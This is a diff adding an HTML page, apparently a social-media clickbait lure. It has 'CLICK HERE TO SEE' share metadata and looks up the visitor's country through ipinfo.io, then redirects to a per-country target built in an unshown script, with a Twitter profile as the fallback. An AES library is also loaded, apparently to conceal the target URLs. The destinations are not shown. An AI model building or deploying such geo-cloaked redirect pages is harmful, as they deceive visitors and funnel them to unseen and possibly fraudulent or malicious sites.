@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CLICK HERE TO SEE</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
+  <script src="jquery-3.4.1.js"></script>
+  <script src="js.js"></script>
+  <meta property="og:image" content="fb-og-image.jpg" />
+  <meta property="og:title" content="CLICK HERE TO SEE" />
+  <meta property="og:description" content="CLICK HERE" />
+  <script>
+    negara = null;
+    $.get("https://ipinfo.io", function (response) {
+      negara = response.country;
+      if (negara !== null) {
+        negara = negara.toLowerCase();
+        target = make_target(negara);
+      } else {
+        target = "https://twitter.com/imkameriana";
+      }
+      window.location = target;
+    }, "jsonp");
+  </script>
+  <style>
+    body {
+      width: 100%;
+      height: auto;
+      background-size: contain;
+      background-position: center;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="rows">
+    <center>
+      <div class="col-md-2"></div>
+      <div class="col-md-8">
+        WAIT 5 SECOND. . .<br>
+        REFRESH IF PAGE NOT REDIRECT . . .
+      </div>
+      <div class="col-md-2"></div>
+    </center>
+  </div>
+</body>
+
+</html>
